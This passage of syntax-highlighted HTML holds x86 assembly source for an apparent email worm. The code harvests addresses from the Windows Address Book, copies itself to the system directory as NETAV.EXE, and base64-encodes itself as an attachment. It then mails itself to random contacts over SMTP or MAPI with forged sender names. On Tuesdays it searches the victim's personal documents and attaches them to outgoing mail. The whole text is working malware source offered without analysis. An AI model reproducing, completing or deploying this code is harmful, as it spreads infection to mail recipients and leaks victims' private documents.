      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">NbWabEmail</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; For the emailfile</span><span class="sc0">
</span><span class="sc5">TruncFriend</span><span class="sc4">:</span><span class="sc0">        
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NbEmailWanted</span><span class="sc0">                  </span><span class="sc1">; Too many Friend</span><span class="sc0">
      </span><span class="sc6">jbe</span><span class="sc0">       </span><span class="sc5">NotManyFriend</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NbEmailWanted</span><span class="sc0">                  </span><span class="sc1">; To many @, reduce it</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; for Html search (inc [NbEmailFound]!)</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; For the Html search</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">NbWabEmail</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; For the emailfile                </span><span class="sc0">
</span><span class="sc5">NotManyFriend</span><span class="sc4">:</span><span class="sc0">        
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">60h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; email @ array</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; normalise</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">EmailList</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; where store email</span><span class="sc0">

</span><span class="sc5">GetWabEmailLoop</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">StockWabEmail</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">GetWabEmailLoop</span><span class="sc0">

</span><span class="sc5">WabUnmapView</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileUnmapView</span><span class="sc0">

</span><span class="sc5">EndWab</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">StockWabEmail</span><span class="sc4">:</span><span class="sc0">        
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">StockWabEmailLoop</span><span class="sc0">
        
</span><span class="sc5">StockWabEmailUnicodeLoop</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lodsw</span><span class="sc0">                                         </span><span class="sc1">; Unicode</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                         </span><span class="sc1">; Ansi</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">StockWabEmailUnicodeLoop</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; next email field in Dest</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">                            </span><span class="sc1">; next email field in Wab</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">StockWabEmailLoop</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">movsb</span><span class="sc0">                                         </span><span class="sc1">; Ansi</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">StockWabEmailLoop</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; next email field in Dest</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">                            </span><span class="sc1">; next email field in Wab</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;..................... Send Email SMTP or MAPI ...............................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">

</span><span class="sc1">; OUT:  Send via SMTP or MAPI #NbToSend Ramdom EmailAddress from EmailFile</span><span class="sc0">


</span><span class="sc5">SendEmail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">MapEmailFile</span><span class="sc0">                </span><span class="sc1">; Map The Email File</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">HowToSend</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">HowToSend</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">SmtpFlag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; init flag to 0     </span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">GetUserSmtpServer</span><span class="sc0">               </span><span class="sc1">; Default Smtp Serveur Found ?</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">        </span><span class="sc5">MapiSendVersion</span><span class="sc0">             </span><span class="sc1">; No</span><span class="sc0">
      </span><span class="sc6">not</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">SmtpFlag</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; flag = 1</span><span class="sc0">

</span><span class="sc5">MapiSendVersion</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">not</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">SmtpFlag</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; flag=0 if SMTP, flag=1 -&gt; MAPI    </span><span class="sc0">

</span><span class="sc5">MapEmailFileOk</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SystemTimeData</span><span class="sc0">              
      </span><span class="sc6">movzx</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Esi point day of week</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; Mardi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">_NormalSend</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">PayloadFlag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">PersonalDocSearch</span><span class="sc0">               </span><span class="sc1">; Personal doc path in mem</span><span class="sc0">

</span><span class="sc5">_NormalSend</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">NormalSendInit</span><span class="sc0">              </span><span class="sc1">; init attachement 4 Normal Send</span><span class="sc0">
    
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NbToSend</span><span class="sc0">                       </span><span class="sc1">; Send NbToSend emails per session</span><span class="sc0">
</span><span class="sc5">SendRandomEmailLoop</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">SelectEmail</span><span class="sc0">                         </span><span class="sc1">; return email ads in esi</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">       </span><span class="sc5">SendBye</span><span class="sc0">                 </span><span class="sc1">; EmailFile empty or NonExploitable</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CurrentEmail</span><span class="sc0">                   </span><span class="sc1">; &lt;-----------------</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EmailSize</span><span class="sc0">                      </span><span class="sc1">;                   |</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0">       </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">; Copy rnd Email in |</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EmailSize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EmailSize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">                       </span><span class="sc1">; Remove email sent in EmailFile</span><span class="sc0">

</span><span class="sc5">PaySendTime</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">PayloadFlag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NormalSend</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">PayloadSendInit</span><span class="sc0">             </span><span class="sc1">; Personals doc name in MyPath</span><span class="sc0">
    
</span><span class="sc5">NormalSend</span><span class="sc4">:</span><span class="sc0">       
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">BuildMessageHeader</span><span class="sc0">          </span><span class="sc1">; build the mime header</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">SmtpFlag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">MapiSendIt</span><span class="sc0">                          </span><span class="sc1">; flag=1 -&gt; MAPI</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">SmtpConnection</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">        </span><span class="sc5">MapiSendIt</span><span class="sc0">                  </span><span class="sc1">; smtp error -&gt; mapi send</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">SmtpSendCommand</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">        </span><span class="sc5">MapiSendIt</span><span class="sc0">                  </span><span class="sc1">; smtp error -&gt; mapi send</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SmtpDisConnection</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SendNext</span><span class="sc0">                    </span><span class="sc1">; If here No Mapi Needed</span><span class="sc0">

</span><span class="sc5">MapiSendIt</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">MapiSend</span><span class="sc0">

</span><span class="sc5">SendNext</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">PayloadFlag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NormalSendNext</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">ReleasePayMem</span><span class="sc0">
</span><span class="sc5">NormalSendNext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">ClearHeaderMem</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">SendRandomEmailLoop</span><span class="sc0">                 </span><span class="sc1">; Send #NbToSend emails</span><span class="sc0">

</span><span class="sc5">SendBye</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileUnmapView</span><span class="sc0">           </span><span class="sc1">; Clean De-map EmailFile</span><span class="sc0">


</span><span class="sc1">;.............. Select Email to Send </span><span class="sc0">

</span><span class="sc1">; OUT:          esi point on the email   </span><span class="sc0">
</span><span class="sc1">;               ecx = 0 if error</span><span class="sc0">
</span><span class="sc1">;               select first the email from the *.WAB</span><span class="sc0">

</span><span class="sc5">SelectEmail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NbEmailWanted</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">SelectIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SelectEmailError</span><span class="sc0">        

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; emails from file in memory</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NbEmailWanted</span><span class="sc0">          </span><span class="sc1">; Rnd Range</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">GetRndNumber</span><span class="sc0">                        </span><span class="sc1">; Rnd Nb in edx</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbWabEmail</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">TriEMails</span><span class="sc0">
        
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbWabEmail</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbWabEmail</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">TriEMails</span><span class="sc4">:</span><span class="sc0">      
      </span><span class="sc6">rol</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                              </span><span class="sc1">; edx*emailsize (64)        </span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; esi on the email</span><span class="sc0">
  
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; No empty email</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">SelectIT</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">                      </span><span class="sc1">; Lower case</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'mbew'</span><span class="sc0">                         </span><span class="sc1">; No webmaster@xxxxxxxx</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">SelectIT</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">                      </span><span class="sc1">; Lower case</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ptth'</span><span class="sc0">                         </span><span class="sc1">; No http:\\xxxxxxxxxxx</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">SelectIT</span><span class="sc0">
</span><span class="sc5">SelectEmailError</span><span class="sc4">:</span><span class="sc0">     
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Normal Init The Attachement File </span><span class="sc0">

</span><span class="sc1">; Routine appele tout le temps (Payload ou pas) -&gt; Init du mess: header + body</span><span class="sc0">

</span><span class="sc5">NormalSendInit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">InitWhoSendName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">ResMemHeader</span><span class="sc0">                </span><span class="sc1">; Some Mem for the mime header</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">KeySize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">       </span><span class="sc1">; Init Size to get</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeySize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mailfrom</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc3">"SMTP Email Address"</span><span class="sc0">            </span><span class="sc1">; User mail (for mail from:)</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AccountKey</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">SHGetValueA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">InitWormName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">UserEmailFoundFlag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">InitWormName</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">  
      </span><span class="sc6">rep</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">
        
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">                 </span><span class="sc1">; System Dir</span><span class="sc0">

      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'\NETAV.EXE'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">lstrcat</span><span class="sc0">                             </span><span class="sc1">; Path+Name 4 Mapi Send&amp;Smtp CodeB64File  </span><span class="sc0">

</span><span class="sc5">SmtpNormalSendInit</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">CodeB64File</span><span class="sc0">                 </span><span class="sc1">; return worm file encoded in mem</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Build Message Header</span><span class="sc0">

</span><span class="sc5">BuildMessageHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; for the loop</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">UserEmailFoundFlag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">BuildHeader</span><span class="sc0"> 

</span><span class="sc5">CreateNameFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mailfrom</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EmailSize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">NbFromName</span><span class="sc0">                  </span><span class="sc1">; nb name</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetRndNumber</span><span class="sc0">                </span><span class="sc1">; edx = rnd nb</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RndFromNameTb</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; table de dd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; Point the right Name offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; User mail not found -&gt; fix another name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mailfrom</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

</span><span class="sc5">CreateServFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">NbFromServ</span><span class="sc0">                  </span><span class="sc1">; nb serv</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetRndNumber</span><span class="sc0">                </span><span class="sc1">; edx = rnd nb</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RndFromServTb</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; table de dd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; Point the right Serv offset</span><span class="sc0">
